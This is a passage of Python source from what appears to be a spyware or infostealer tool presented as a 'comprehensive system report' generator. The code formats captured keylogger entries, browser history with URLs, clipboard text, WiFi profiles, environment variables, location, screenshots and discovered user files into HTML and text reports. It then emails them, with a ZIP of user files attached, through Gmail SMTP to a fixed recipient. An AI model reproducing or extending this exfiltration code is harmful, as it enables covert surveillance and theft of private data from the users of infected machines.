            .badge-green { background: #e8f5e9; color: #2e7d32; }
            .badge-red { background: #fce4ec; color: #c62828; }
            .badge-orange { background: #fff3e0; color: #e65100; }
            .progress-bar { background: #e0e0e0; border-radius: 4px; height: 14px; overflow: hidden; }
            .progress-fill { background: linear-gradient(90deg, #1a237e, #3949ab); height: 100%; border-radius: 4px; }
            .footer { background: #f5f5f5; padding: 15px 40px; border-top: 1px solid #ddd; font-size: 11px; color: #666; text-align: center; }
            .mono { font-family: 'Consolas', 'Courier New', monospace; font-size: 11px; }
            .small { font-size: 11px; color: #666; }
        </style>"""

        def kv_row(label, value):
            return f'<tr><td>{label}</td><td>{value}</td></tr>'

        def progress_html(pct):
            try:
                p = float(pct)
            except (TypeError, ValueError):
                return str(pct)
            color = '#2e7d32' if p < 60 else '#e65100' if p < 85 else '#c62828'
            return f'<div class="progress-bar"><div class="progress-fill" style="width:{p}%;background:{color}"></div></div> {p}%'

        def fmt_bytes(b):
            try:
                gb = b / (1024**3)
                return f'{gb:.2f} GB'
            except (TypeError, ZeroDivisionError):
                return 'N/A'

        h = []
        h.append(f'<html><head>{css}</head><body>')
        h.append('<div class="container">')

        # ── HEADER ──
        h.append('<div class="header">')
        h.append('<h1>&#128187; COMPREHENSIVE SYSTEM REPORT</h1>')
        h.append(f'<p>Generated: {data.get("timestamp", "N/A")} &bull; Host: {sys_info.get("hostname", "N/A")}</p>')
        h.append(f'<div class="ip-badge">Local IP: {sys_info.get("ip_address", "N/A")} &bull; Public IP: {net_extra.get("public_ip", "N/A")}</div>')
        h.append('</div>')
        h.append('<div class="content">')

        # ── 1. SYSTEM INFO ──
        h.append('<div class="section"><div class="section-title">1. System Information</div>')
        h.append('<table class="kv-table">')
        h.append(kv_row('Hostname', sys_info.get('hostname', 'N/A')))
        h.append(kv_row('Platform', f'{sys_info.get("platform", "N/A")} {sys_info.get("platform_release", "")}'))
        h.append(kv_row('OS Version', sys_info.get('platform_version', 'N/A')))
        h.append(kv_row('Architecture', sys_info.get('architecture', 'N/A')))
        h.append(kv_row('Processor', sys_info.get('processor', 'N/A')))
        h.append(kv_row('Local IP', f'<span class="badge">{sys_info.get("ip_address", "N/A")}</span>'))
        h.append(kv_row('Public IP', f'<span class="badge">{net_extra.get("public_ip", "N/A")}</span>'))
        h.append(kv_row('Boot Time', basic.get('boot_time', 'N/A')))
        h.append(kv_row('Uptime', uptime.get('uptime', 'N/A')))
        h.append('</table></div>')

        # ── 2. CPU ──
        h.append('<div class="section"><div class="section-title">2. CPU Information</div>')
        h.append('<table class="kv-table">')
        h.append(kv_row('CPU Name', cpu.get('name', 'N/A')))
        h.append(kv_row('Manufacturer', cpu.get('manufacturer', 'N/A')))
        h.append(kv_row('Cores', f'{cpu.get("physical_cores","N/A")} physical / {cpu.get("total_cores","N/A")} logical'))
        h.append(kv_row('Frequency', f'{cpu.get("current_frequency","N/A")} MHz (max {cpu.get("max_frequency","N/A")} MHz)'))
        h.append(kv_row('Total Usage', progress_html(cpu.get('total_usage', 0))))
        h.append('</table></div>')

        # ── 3. MEMORY ──
        h.append('<div class="section"><div class="section-title">3. Memory</div>')
        h.append('<table class="kv-table">')
        h.append(kv_row('Total RAM', fmt_bytes(mem.get('total', 0))))
        h.append(kv_row('Used', f'{fmt_bytes(mem.get("used", 0))} &mdash; {progress_html(mem.get("percentage", 0))}'))
        h.append(kv_row('Available', fmt_bytes(mem.get('available', 0))))
        h.append(kv_row('Swap', f'{fmt_bytes(mem.get("swap_total", 0))} ({mem.get("swap_percentage", 0)}% used)'))
        h.append('</table></div>')

        # ── 4. DISKS ──
        h.append(f'<div class="section"><div class="section-title">4. Disk Partitions ({len(disks)})</div>')
        h.append('<table><tr><th>Drive</th><th>Type</th><th>Total</th><th>Used</th><th>Free</th><th>Usage</th></tr>')
        for d in disks:
            h.append(f'<tr><td>{d.get("device","")}</td><td>{d.get("file_system_type","")}</td>')
            h.append(f'<td>{fmt_bytes(d.get("total_size",0))}</td><td>{fmt_bytes(d.get("used",0))}</td>')
            h.append(f'<td>{fmt_bytes(d.get("free",0))}</td><td>{progress_html(d.get("percentage",0))}</td></tr>')
        h.append('</table></div>')

        # ── 5. GPU ──
        h.append(f'<div class="section"><div class="section-title">5. GPU ({len(gpus)} adapters)</div>')
        h.append('<table><tr><th>Name</th><th>VRAM</th><th>Driver</th></tr>')
        for g in gpus:
            h.append(f'<tr><td>{g.get("name","N/A")}</td><td>{g.get("adapter_ram","N/A")}</td><td>{g.get("driver_version","N/A")}</td></tr>')
        h.append('</table></div>')

        # ── 6. MOTHERBOARD & BIOS ──
        h.append('<div class="section"><div class="section-title">6. Motherboard &amp; BIOS</div>')
        h.append('<table class="kv-table">')
        h.append(kv_row('Board Manufacturer', mb.get('manufacturer', 'N/A')))
        h.append(kv_row('Board Product', mb.get('product', 'N/A')))
        h.append(kv_row('Board Serial', mb.get('serial_number', 'N/A')))
        h.append(kv_row('BIOS Manufacturer', bios.get('manufacturer', 'N/A')))
        h.append(kv_row('BIOS Version', bios.get('version', 'N/A')))
        h.append('</table></div>')

        # ── 7. NETWORK ──
        io = net.get('io_counters', {})
        wifi = net_extra.get('wifi_profiles', [])
        dns = net_extra.get('dns_servers', [])
        conns = net_extra.get('active_connections', [])
        h.append('<div class="section"><div class="section-title">7. Network</div>')
        h.append('<table class="kv-table">')
        h.append(kv_row('Public IP', f'<span class="badge">{net_extra.get("public_ip","N/A")}</span>'))
        h.append(kv_row('Local IP', sys_info.get('ip_address', 'N/A')))
        h.append(kv_row('Data Sent', f'{io.get("bytes_sent",0)/(1024**2):.1f} MB'))
        h.append(kv_row('Data Received', f'{io.get("bytes_recv",0)/(1024**2):.1f} MB'))
        h.append(kv_row('DNS Servers', ', '.join(dns) if dns else 'N/A'))
        h.append(kv_row('WiFi Profiles', f'{len(wifi)} saved &mdash; {", ".join(wifi[:10])}{"..." if len(wifi)>10 else ""}'))
        h.append(kv_row('Active Connections', f'<span class="badge">{len(conns)}</span>'))
        h.append('</table>')
        if conns:
            h.append(f'<details><summary class="small">Show top {min(len(conns),20)} connections</summary><table class="mono">')
            h.append('<tr><th>Local</th><th>Remote</th><th>PID</th></tr>')
            for c in conns[:20]:
                h.append(f'<tr><td>{c.get("local","")}</td><td>{c.get("remote","")}</td><td>{c.get("pid","")}</td></tr>')
            h.append('</table></details>')
        h.append('</div>')

        # ── 8. BROWSER HISTORY ──
        total_bh = sum(len(v) for v in browser.values() if isinstance(v, list))
        h.append(f'<div class="section"><div class="section-title">8. Browser History ({total_bh} entries)</div>')
        for bname in ['chrome', 'edge', 'firefox']:
            entries = browser.get(bname, [])
            if entries:
                h.append(f'<p><strong>{bname.title()}</strong> ({len(entries)} entries):</p>')
                h.append('<table class="mono"><tr><th>Time</th><th>Title</th></tr>')
                for e in entries[:10]:
                    if isinstance(e, (list, tuple)):
                        h.append(f'<tr><td style="white-space:nowrap">{e[2] if len(e)>2 else "N/A"}</td><td>{e[1] if len(e)>1 else e[0]}</td></tr>')
                    elif isinstance(e, dict):
                        h.append(f'<tr><td style="white-space:nowrap">{e.get("visit_time",e.get("last_visit_date",""))}</td><td>{e.get("title","")}</td></tr>')
                h.append('</table>')
                if len(entries)>10:
                    h.append(f'<p class="small">... and {len(entries)-10} more</p>')
        h.append('</div>')

        # ── 9. KEYLOGGER ──
        h.append('<div class="section"><div class="section-title">9. Keylogger Data</div>')
        h.append('<table class="kv-table">')
        h.append(kv_row('Active', f'<span class="badge badge-green">Yes</span>' if keylog.get('present') else '<span class="badge badge-red">No</span>'))
        h.append(kv_row('Log File', f'<span class="mono">{keylog.get("path","N/A")}</span>'))
        h.append(kv_row('Total Lines', str(keylog.get('line_count', 0))))
        h.append('</table>')
        entries = keylog.get('last_entries', [])
        if entries:
            h.append(f'<details><summary class="small">Show last {len(entries)} keylog entries</summary>')
            h.append('<pre class="mono" style="background:#f5f5f5;padding:10px;border:1px solid #ddd;max-height:300px;overflow:auto;font-size:10px;">')
            h.append('\n'.join(entries))
            h.append('</pre></details>')
        h.append('</div>')

        # ── 10. CLIPBOARD ──
        h.append('<div class="section"><div class="section-title">10. Clipboard</div>')
        h.append('<table class="kv-table">')
        h.append(kv_row('Types', ', '.join(clip.get('clipboard_types', [])) or 'None'))
        h.append(kv_row('Has Image', str(clip.get('clipboard_has_image', False))))
        ct = clip.get('clipboard_text', '')
        if ct:
            h.append(kv_row('Text Preview', f'<span class="mono">{ct[:300]}{"..." if len(ct)>300 else ""}</span>'))
        h.append('</table></div>')

        # ── 11. FILES ──
        file_list = files_info.get('files', [])
        dir_summary = files_info.get('directory_summary', {})
        h.append(f'<div class="section"><div class="section-title">11. Discovered Files ({files_info.get("count",0)})</div>')
        if dir_summary:
            h.append('<p class="small">Files per directory: ')
            h.append(' &bull; '.join(f'<strong>{k}</strong>: {v}' for k,v in dir_summary.items()))
            h.append('</p>')
        if file_list:
            h.append('<table><tr><th>File</th><th>Directory</th><th>Size</th><th>Modified</th></tr>')
            for f in file_list[:50]:
                if isinstance(f, dict):
                    sz = f.get('size', 0)
                    sz_str = f'{sz/1024:.1f} KB' if sz > 1024 else f'{sz} B'
                    h.append(f'<tr><td class="mono">{f.get("name","")}</td><td>{f.get("directory","")}</td><td>{sz_str}</td><td>{f.get("modified","")}</td></tr>')
            h.append('</table>')
            if len(file_list) > 50:
                h.append(f'<p class="small">... and {len(file_list)-50} more files</p>')
        h.append('</div>')

        # ── 12. USB ──
        h.append('<div class="section"><div class="section-title">12. USB Devices</div>')
        if isinstance(usb, dict) and 'error' not in usb:
            devs = usb.get('devices', [])
            h.append(f'<p>{len(devs)} USB devices found</p>')
            if devs:
                h.append('<table><tr><th>#</th><th>Device Name</th></tr>')
                for i, d in enumerate(devs[:20], 1):
                    name = d.get('Name', d.get('name', str(d))) if isinstance(d, dict) else str(d)
                    h.append(f'<tr><td>{i}</td><td>{name}</td></tr>')
                h.append('</table>')
        else:
            h.append(f'<p class="small">{usb.get("error","No USB data")}</p>')
        h.append('</div>')

        # ── 13. PROCESSES ──
        if isinstance(procs, list) and procs:
            h.append(f'<div class="section"><div class="section-title">13. Running Processes ({len(procs)})</div>')
            h.append('<table class="mono"><tr><th>PID</th><th>Name</th><th>User</th><th>CPU%</th><th>MEM%</th></tr>')
            for p in procs[:30]:
                h.append(f'<tr><td>{p.get("pid","")}</td><td>{p.get("name","")}</td><td>{p.get("username","")}</td>')
                h.append(f'<td>{p.get("cpu_percent","")}</td><td>{p.get("memory_percent","")}</td></tr>')
            h.append('</table>')
            if len(procs) > 30:
                h.append(f'<p class="small">... and {len(procs)-30} more</p>')
            h.append('</div>')

        # ── 14. INSTALLED SOFTWARE ──
        h.append(f'<div class="section"><div class="section-title">14. Installed Software ({len(installed)})</div>')
        if installed:
            h.append('<table><tr><th>#</th><th>Name</th><th>Version</th><th>Vendor</th></tr>')
            for i, sw in enumerate(installed, 1):
                h.append(f'<tr><td>{i}</td><td>{sw.get("name","")}</td><td>{sw.get("version","")}</td><td>{sw.get("vendor","")}</td></tr>')
            h.append('</table>')
        h.append('</div>')

        # ── 15. SERVICES ──
        h.append(f'<div class="section"><div class="section-title">15. Running Services ({len(services)})</div>')
        if services:
            h.append('<details><summary class="small">Show all services</summary>')
            h.append('<table><tr><th>Service</th><th>Start Mode</th></tr>')
            for svc in services:
                h.append(f'<tr><td>{svc.get("display_name",svc.get("name",""))}</td><td>{svc.get("start_mode","")}</td></tr>')
            h.append('</table></details>')
        h.append('</div>')

        # ── 16. STARTUP ──
        h.append(f'<div class="section"><div class="section-title">16. Startup Programs ({len(startup)})</div>')
        if startup:
            h.append('<table><tr><th>Name</th><th>Command</th></tr>')
            for prog in startup:
                cmd_text = str(prog.get('command', ''))
                if len(cmd_text) > 80:
                    cmd_text = cmd_text[:80] + '...'
                h.append(f'<tr><td>{prog.get("name","")}</td><td class="mono">{cmd_text}</td></tr>')
            h.append('</table>')
        h.append('</div>')

        # ── FOOTER ──
        h.append('</div>')  # end content
        h.append('<div class="footer">')
        h.append(f'System Report &bull; {sys_info.get("hostname","N/A")} &bull; ')
        h.append(f'Local: {sys_info.get("ip_address","N/A")} &bull; Public: {net_extra.get("public_ip","N/A")} &bull; ')
        h.append(f'{data.get("timestamp","N/A")}')
        h.append('</div>')
        h.append('</div></body></html>')

        return ''.join(h)

    def format_info_for_email(self, data):
        """Format ALL system information into a comprehensive, human-readable report."""
        lines = []
        sep = "=" * 70
        sub_sep = "-" * 70

        # ── HEADER ──
        lines.append(sep)
        lines.append("  COMPREHENSIVE SYSTEM INFORMATION REPORT")
        lines.append(f"  Report Generated : {data.get('timestamp', 'N/A')}")
        lines.append(sep)

        # ── 1. BASIC SYSTEM INFO ──
        basic = data.get('basic_info', {})
        sys_info = basic.get('system', {})
        net_info = data.get('net_info', {})
        lines.append(f"\n[1] BASIC SYSTEM INFO")
        lines.append(sub_sep)
        lines.append(f"  Hostname       : {sys_info.get('hostname', 'N/A')}")
        lines.append(f"  Platform       : {sys_info.get('platform', 'N/A')} {sys_info.get('platform_release', '')}")
        lines.append(f"  OS Version     : {sys_info.get('platform_version', 'N/A')}")
        lines.append(f"  Architecture   : {sys_info.get('architecture', 'N/A')}")
        lines.append(f"  Processor      : {sys_info.get('processor', 'N/A')}")
        lines.append(f"  Local IP       : {sys_info.get('ip_address', 'N/A')}")
        lines.append(f"  Public IP      : {net_info.get('public_ip', net_info.get('public_ip_error', 'N/A'))}")
        lines.append(f"  Boot Time      : {basic.get('boot_time', 'N/A')}")

        # ── 2. CPU INFO ──
        cpu = data.get('cpu_info', {})
        lines.append(f"\n[2] CPU INFO")
        lines.append(sub_sep)
        lines.append(f"  Name           : {cpu.get('name', 'N/A')}")
        lines.append(f"  Manufacturer   : {cpu.get('manufacturer', 'N/A')}")
        lines.append(f"  Physical Cores : {cpu.get('physical_cores', 'N/A')}")
        lines.append(f"  Total Cores    : {cpu.get('total_cores', 'N/A')}")
        lines.append(f"  Max Frequency  : {cpu.get('max_frequency', 'N/A')} MHz")
        lines.append(f"  Min Frequency  : {cpu.get('min_frequency', 'N/A')} MHz")
        lines.append(f"  Current Freq   : {cpu.get('current_frequency', 'N/A')} MHz")
        lines.append(f"  Total Usage    : {cpu.get('total_usage', 'N/A')}%")
        per_core = cpu.get('usage_per_core', [])
        if per_core:
            lines.append(f"  Per-Core Usage : {', '.join(f'{c}%' for c in per_core)}")

        # ── 3. MEMORY INFO ──
        mem = data.get('memory_info', {})
        lines.append(f"\n[3] MEMORY INFO")
        lines.append(sub_sep)
        total_gb = mem.get('total', 0) / (1024**3) if mem.get('total') else 0
        used_gb = mem.get('used', 0) / (1024**3) if mem.get('used') else 0
        avail_gb = mem.get('available', 0) / (1024**3) if mem.get('available') else 0
        lines.append(f"  Total          : {total_gb:.2f} GB")
        lines.append(f"  Used           : {used_gb:.2f} GB ({mem.get('percentage', 'N/A')}%)")
        lines.append(f"  Available      : {avail_gb:.2f} GB")
        lines.append(f"  Swap Total     : {mem.get('swap_total', 0) / (1024**3):.2f} GB")
        lines.append(f"  Swap Used      : {mem.get('swap_used', 0) / (1024**3):.2f} GB ({mem.get('swap_percentage', 'N/A')}%)")

        # ── 4. DISK INFO ──
        disks = data.get('disk_info', [])
        lines.append(f"\n[4] DISK INFO ({len(disks)} partitions)")
        lines.append(sub_sep)
        for i, disk in enumerate(disks, 1):
            lines.append(f"  [{i}] {disk.get('device', 'N/A')} -> {disk.get('mountpoint', 'N/A')}")
            lines.append(f"      File System : {disk.get('file_system_type', 'N/A')}")
            lines.append(f"      Total       : {disk.get('total_size', 0) / (1024**3):.2f} GB")
            lines.append(f"      Used        : {disk.get('used', 0) / (1024**3):.2f} GB ({disk.get('percentage', 'N/A')}%)")
            lines.append(f"      Free        : {disk.get('free', 0) / (1024**3):.2f} GB")

        # ── 5. GPU INFO ──
        gpus = data.get('gpu_info', [])
        lines.append(f"\n[5] GPU INFO ({len(gpus)} adapters)")
        lines.append(sub_sep)
        for i, gpu in enumerate(gpus, 1):
            lines.append(f"  [{i}] {gpu.get('name', 'N/A')}")
            lines.append(f"      Adapter RAM    : {gpu.get('adapter_ram', 'N/A')}")
            lines.append(f"      Driver Version : {gpu.get('driver_version', 'N/A')}")
            lines.append(f"      Driver Date    : {gpu.get('driver_date', 'N/A')}")
            lines.append(f"      Video Mode     : {gpu.get('video_mode_description', 'N/A')}")

        # ── 6. MOTHERBOARD INFO ──
        mb = data.get('motherboard_info', {})
        lines.append(f"\n[6] MOTHERBOARD INFO")
        lines.append(sub_sep)
        lines.append(f"  Manufacturer   : {mb.get('manufacturer', 'N/A')}")
        lines.append(f"  Product        : {mb.get('product', 'N/A')}")
        lines.append(f"  Version        : {mb.get('version', 'N/A')}")
        lines.append(f"  Serial Number  : {mb.get('serial_number', 'N/A')}")

        # ── 7. BIOS INFO ──
        bios = data.get('bios_info', {})
        lines.append(f"\n[7] BIOS INFO")
        lines.append(sub_sep)
        lines.append(f"  Manufacturer   : {bios.get('manufacturer', 'N/A')}")
        lines.append(f"  Name           : {bios.get('name', 'N/A')}")
        lines.append(f"  Version        : {bios.get('version', 'N/A')}")
        lines.append(f"  Release Date   : {bios.get('release_date', 'N/A')}")

        # ── 8. SYSTEM UPTIME ──
        uptime = data.get('system_uptime', {})
        lines.append(f"\n[8] SYSTEM UPTIME")
        lines.append(sub_sep)
        lines.append(f"  Boot Time      : {uptime.get('boot_time', 'N/A')}")
        lines.append(f"  Uptime         : {uptime.get('uptime', 'N/A')}")

        # ── 9. NETWORK INFO ──
        network = data.get('network_info', {})
        io = network.get('io_counters', {})
        lines.append(f"\n[9] NETWORK INFO")
        lines.append(sub_sep)
        lines.append(f"  Public IP      : {net_info.get('public_ip', net_info.get('public_ip_error', 'N/A'))}")
        lines.append(f"  Local IP       : {sys_info.get('ip_address', 'N/A')}")
        lines.append(f"  Bytes Sent     : {io.get('bytes_sent', 0) / (1024**2):.2f} MB")
        lines.append(f"  Bytes Received : {io.get('bytes_recv', 0) / (1024**2):.2f} MB")
        lines.append(f"  Packets Sent   : {io.get('packets_sent', 0)}")
        lines.append(f"  Packets Recv   : {io.get('packets_recv', 0)}")
        # DNS Servers
        dns = net_info.get('dns_servers', [])
        if dns:
            lines.append(f"  DNS Servers    : {', '.join(dns)}")
        # WiFi profiles
        wifi = net_info.get('wifi_profiles', [])
        if wifi:
            lines.append(f"  WiFi Profiles  : {len(wifi)} found")
            for wp in wifi:
                lines.append(f"    - {wp}")
        # Network Interfaces
        interfaces = network.get('interfaces', {})
        if interfaces:
            lines.append(f"\n  Network Interfaces ({len(interfaces)}):")
            for iface_name, addrs in interfaces.items():
                for addr in addrs:
                    lines.append(f"    {iface_name} [{addr.get('type', '?')}]: {addr.get('address', 'N/A')} / {addr.get('netmask', 'N/A')}")
        # Active connections
        conns = net_info.get('active_connections', [])
        if conns:
            lines.append(f"\n  Active TCP Connections ({len(conns)}):")
            for c in conns[:30]:
                lines.append(f"    Local: {c.get('local', 'N/A')}  ->  Remote: {c.get('remote', 'N/A')}  (PID {c.get('pid', '?')})")
            if len(conns) > 30:
                lines.append(f"    ... and {len(conns) - 30} more")

        # ── 10. BROWSER HISTORY ──
        browser = data.get('browser_history', {})
        total_entries = sum(len(v) for v in browser.values() if isinstance(v, list))
        lines.append(f"\n[10] BROWSER HISTORY ({total_entries} entries)")
        lines.append(sub_sep)
        for browser_name in ['chrome', 'edge', 'firefox']:
            entries = browser.get(browser_name, [])
            error = browser.get(f'{browser_name}_error', None)
            if error:
                lines.append(f"  {browser_name.title()}: Error - {error}")
            elif entries:
                lines.append(f"  {browser_name.title()} ({len(entries)} entries):")
                for entry in entries[:15]:
                    if isinstance(entry, dict):
                        lines.append(f"    [{entry.get('visit_time', entry.get('last_visit_date', 'N/A'))}] {entry.get('title', 'N/A')}")
                        lines.append(f"      URL: {entry.get('url', 'N/A')}")
                    else:
                        lines.append(f"    {entry}")
                if len(entries) > 15:
                    lines.append(f"    ... and {len(entries) - 15} more entries")
            else:
                lines.append(f"  {browser_name.title()}: No entries found")

        # ── 11. CLIPBOARD INFO ──
        clip = data.get('clipboard_info', {})
        lines.append(f"\n[11] CLIPBOARD INFO")
        lines.append(sub_sep)
        lines.append(f"  Content Types  : {', '.join(clip.get('clipboard_types', [])) or 'None'}")
        lines.append(f"  Has Image      : {clip.get('clipboard_has_image', False)}")
        clip_text = clip.get('clipboard_text', '')
        if clip_text:
            preview = clip_text[:500].replace('\n', '\\n')
            lines.append(f"  Text Preview   : {preview}")
            if len(clip_text) > 500:
                lines.append(f"  (Truncated, full length: {len(clip_text)} chars)")

        # ── 12. SCREENSHOT INFO ──
        screenshot = data.get('screenshot_info', {})
        lines.append(f"\n[12] SCREENSHOT INFO")
        lines.append(sub_sep)
        lines.append(f"  Total Found    : {screenshot.get('count', 0)}")
        ss_list = screenshot.get('screenshots', [])
        for ss in ss_list[:10]:
            lines.append(f"    [{ss.get('modified', 'N/A')}] {ss.get('path', 'N/A')} ({ss.get('size_bytes', 0)} bytes)")

        # ── 13. KEYLOGGER INFO ──
        keylog = data.get('keylogger_info', {})
        lines.append(f"\n[13] KEYLOGGER INFO")
        lines.append(sub_sep)
        lines.append(f"  Active         : {keylog.get('present', False)}")
        lines.append(f"  Log File       : {keylog.get('path', 'N/A')}")
        lines.append(f"  Total Lines    : {keylog.get('line_count', 0)}")
        key_entries = keylog.get('last_entries', [])
        if key_entries:
            lines.append(f"  Last {len(key_entries)} Entries:")
            for entry in key_entries:
                lines.append(f"    {entry}")

        # ── 14. LOCATION INFO ──
        loc = data.get('location_info', {})
        lines.append(f"\n[14] LOCATION INFO")
        lines.append(sub_sep)
        if isinstance(loc, dict) and 'error' not in loc:
            for src, val in loc.items():
                if isinstance(val, dict):
                    lines.append(f"  Source: {src}")
                    for k, v in val.items():
                        lines.append(f"    {k}: {v}")
                else:
                    lines.append(f"  {src}: {val}")
        else:
            lines.append(f"  {loc.get('error', 'No location data available')}")

        # ── 15. USB DEVICE INFO ──
        usb = data.get('usb_info', {})
        lines.append(f"\n[15] USB DEVICE INFO")
        lines.append(sub_sep)
        if isinstance(usb, dict) and 'error' not in usb:
            devices = usb.get('devices', [])
            lines.append(f"  USB Devices ({len(devices)}):")
            for i, dev in enumerate(devices[:20], 1):
                if isinstance(dev, dict):
                    lines.append(f"    [{i}] {dev.get('Name', dev.get('name', 'N/A'))}")
                else:
                    lines.append(f"    [{i}] {dev}")
            drives = usb.get('removable_drives', [])
            if drives:
                lines.append(f"  Removable Drives ({len(drives)}):")
                for drv in drives:
                    if isinstance(drv, dict):
                        lines.append(f"    {drv.get('drive', 'N/A')} - {drv.get('label', 'N/A')} ({drv.get('filesystem', 'N/A')})")
                    else:
                        lines.append(f"    {drv}")
        else:
            lines.append(f"  {usb.get('error', 'No USB data available')}")

        # ── 16. FILES INFO ──
        files = data.get('files_info', {})
        lines.append(f"\n[16] DISCOVERED FILES")
        lines.append(sub_sep)
        lines.append(f"  Total Found    : {files.get('count', 0)}")
        file_list = files.get('files', [])
        for fi in file_list[:20]:
            if isinstance(fi, dict):
                lines.append(f"    {fi.get('path', fi.get('name', 'N/A'))} ({fi.get('size', fi.get('size_bytes', 'N/A'))} bytes)")
            else:
                lines.append(f"    {fi}")

        # ── 17. RUNNING PROCESSES ──
        procs = data.get('process_info', [])
        if isinstance(procs, list):
            lines.append(f"\n[17] RUNNING PROCESSES (top {len(procs)})")
            lines.append(sub_sep)
            lines.append(f"  {'PID':<8} {'Name':<30} {'User':<25} {'CPU%':<8} {'MEM%':<8}")
            lines.append(f"  {'-'*8} {'-'*30} {'-'*25} {'-'*8} {'-'*8}")
            for p in procs:
                pid = str(p.get('pid', ''))[:7]
                name = str(p.get('name', ''))[:29]
                user = str(p.get('username', ''))[:24]
                cpu_p = str(p.get('cpu_percent', ''))[:7]
                mem_p = str(p.get('memory_percent', ''))[:7]
                lines.append(f"  {pid:<8} {name:<30} {user:<25} {cpu_p:<8} {mem_p:<8}")

        # ── 18. INSTALLED SOFTWARE ──
        installed = data.get('installed_software', [])
        lines.append(f"\n[18] INSTALLED SOFTWARE ({len(installed)} programs)")
        lines.append(sub_sep)
        for i, sw in enumerate(installed, 1):
            name = sw.get('name', 'N/A')
            ver = sw.get('version', 'N/A')
            vendor = sw.get('vendor', 'N/A')
            lines.append(f"  [{i:>3}] {name} v{ver} ({vendor})")

        # ── 19. RUNNING SERVICES ──
        services = data.get('running_services', [])
        lines.append(f"\n[19] RUNNING SERVICES ({len(services)} active)")
        lines.append(sub_sep)
        for svc in services:
            lines.append(f"  - {svc.get('display_name', svc.get('name', 'N/A'))} [{svc.get('start_mode', 'N/A')}]")

        # ── 20. STARTUP PROGRAMS ──
        startup = data.get('startup_programs', [])
        lines.append(f"\n[20] STARTUP PROGRAMS ({len(startup)} entries)")
        lines.append(sub_sep)
        for prog in startup:
            lines.append(f"  - {prog.get('name', 'N/A')}")
            lines.append(f"    Command  : {prog.get('command', 'N/A')}")
            lines.append(f"    Location : {prog.get('location', 'N/A')}")

        # ── 21. ENVIRONMENT VARIABLES ──
        env_vars = data.get('environment_variables', {})
        lines.append(f"\n[21] ENVIRONMENT VARIABLES ({len(env_vars)} variables)")
        lines.append(sub_sep)
        for key in sorted(env_vars.keys()):
            val = str(env_vars[key])
            if len(val) > 200:
                val = val[:200] + "..."
            lines.append(f"  {key} = {val}")

        # ── FOOTER ──
        lines.append("")
        lines.append(sep)
        lines.append("  END OF COMPREHENSIVE SYSTEM REPORT")
        lines.append(f"  Report Timestamp : {data.get('timestamp', 'N/A')}")
        lines.append(f"  Local IP         : {sys_info.get('ip_address', 'N/A')}")
        lines.append(f"  Public IP        : {net_info.get('public_ip', 'N/A')}")
        lines.append(sep)

        return "\n".join(lines)
    
    def send_email(self, data, recipient=EMAIL_TO, zip_file=None):
        """Send system information via email with combined .txt.json and optional ZIP attachment"""
        try:
            if not GMAIL_APP_PASSWORD:
                print("\n[ERROR] Gmail app password is not configured.")
                print("Set GMAIL_APP_PASSWORD as an environment variable before sending email.")
                return False

            # Create the email message
            msg = MIMEMultipart('mixed')
            msg['From'] = EMAIL_FROM
            msg['To'] = recipient
            hostname = data.get('basic_info', {}).get('system', {}).get('hostname', 'Unknown')
            local_ip = data.get('basic_info', {}).get('system', {}).get('ip_address', 'N/A')
            public_ip = data.get('net_info', {}).get('public_ip', 'N/A')
            msg['Subject'] = f"System Report - {hostname} [{local_ip} / {public_ip}] - {data.get('timestamp', 'N/A')}"

            # Email body (HTML + plain text)
            body_text = self.format_info_for_email(data)
            body_html = self.format_info_for_email_html(data)

            alternative_part = MIMEMultipart('alternative')
            alternative_part.attach(MIMEText(body_text, 'plain', 'utf-8'))
            alternative_part.attach(MIMEText(body_html, 'html', 'utf-8'))
            msg.attach(alternative_part)

            # Build the single combined .txt.json content
            json_data = json.dumps(data, indent=4, default=str)
            combined_content = body_text
            combined_content += "\n\n"
            combined_content += "=" * 70 + "\n"
            combined_content += "  RAW JSON DATA (Machine-Readable)\n"
            combined_content += "=" * 70 + "\n\n"
            combined_content += json_data

            timestamp = dt.now().strftime('%Y%m%d_%H%M%S')
            combined_attachment = MIMEText(combined_content, 'plain', 'utf-8')
            combined_attachment.add_header(
                'Content-Disposition',
                f'attachment; filename="system_report_{hostname}_{timestamp}.txt.json"'
            )
            msg.attach(combined_attachment)

            # Attach the compressed ZIP file if provided (contains report + user files)
            if zip_file and os.path.exists(zip_file):
                zip_size_mb = os.path.getsize(zip_file) / (1024 * 1024)
                if zip_size_mb <= 24:  # Gmail attachment limit ~25MB
                    with open(zip_file, 'rb') as f:
                        zip_attachment = MIMEBase('application', 'zip')
                        zip_attachment.set_payload(f.read())
                        encoders.encode_base64(zip_attachment)
                        zip_attachment.add_header(
                            'Content-Disposition',
                            f'attachment; filename="{os.path.basename(zip_file)}"'
                        )
                        msg.attach(zip_attachment)
                    print(f"Attached ZIP file: {zip_file} ({zip_size_mb:.2f} MB)")
                else:
                    print(f"ZIP file too large for email ({zip_size_mb:.1f} MB > 24 MB limit), skipping attachment.")
            
            # Send via Gmail SMTP
            print(f"Connecting to Gmail SMTP server...")
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.ehlo()
                server.starttls()
                server.ehlo()
                server.login(EMAIL_FROM, GMAIL_APP_PASSWORD)
                server.send_message(msg)
            
            print(f"Email sent successfully to {recipient}!")
            return True
            
        except smtplib.SMTPAuthenticationError:
            print("\n[ERROR] Gmail authentication failed!")
            print("Make sure you have:")
            print("  1. Enabled 2-Step Verification on your Google Account")
            print("  2. Generated an App Password at:")
            print("     https://myaccount.google.com/apppasswords")
            print("  3. Set the GMAIL_APP_PASSWORD environment variable or")
            print("     updated the GMAIL_APP_PASSWORD variable in this script")
            return False
        except Exception as e:
            print(f"\n[ERROR] Failed to send email: {e}")
            return False
    
    def display_summary(self):
        """Display a summary of system information"""
        info = self.get_basic_system_info()
        cpu = self.get_cpu_info()
        mem = self.get_memory_info()
        
        print("\n" + "=" * 60)
        print("  SYSTEM INFORMATION SUMMARY")
        print("=" * 60)
        
        print(f"\n  Hostname:     {info['system']['hostname']}")
        print(f"  Platform:     {info['system']['platform']} {info['system']['platform_release']}")
        print(f"  Architecture: {info['system']['architecture']}")
        print(f"  Processor:    {info['system']['processor']}")
        print(f"  IP Address:   {info['system']['ip_address']}")
        print(f"  Boot Time:    {info['boot_time']}")
        
        print(f"\n  CPU:")
        print(f"    Name:       {cpu.get('name', 'N/A')}")
        print(f"    Cores:      {cpu['physical_cores']} physical, {cpu['total_cores']} logical")
        print(f"    Usage:      {cpu['total_usage']}%")
        
        print(f"\n  Memory:")
        print(f"    Total:      {mem['total'] / (1024**3):.2f} GB")
